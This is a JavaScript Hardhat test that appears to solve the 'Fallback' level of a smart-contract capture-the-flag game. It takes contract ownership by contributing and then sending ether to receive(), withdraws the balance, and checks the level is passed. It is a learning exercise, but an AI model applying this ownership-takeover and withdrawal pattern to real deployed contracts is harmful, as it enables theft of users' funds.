const { expect } = require("chai");
const { ethers } = require("hardhat");

const { setupLevel } = require("./utils");

describe("Fallback", async function () {
    let deployer;
    let player;
    let factory;
    let instance;

    before(async function () {
        [deployer, player] = await ethers.getSigners();

        level = await setupLevel("Fallback", player.address);
        factory = level.factory;
        instance = level.instance;
    });

    it("Exploit", async function () {
        await instance.connect(player).contribute({ value: 1 });

        // Call receive() on instance
        await player.sendTransaction({
            to: instance.address,
            value: 1
        });

        // Player should have acquired ownership
        expect(await instance.owner()).to.equal(player.address);

        await instance.connect(player).withdraw();
    });

    after(async function () {
        expect(await factory.callStatic.validateInstance(instance.address, player.address)).to.be.true;
    });
});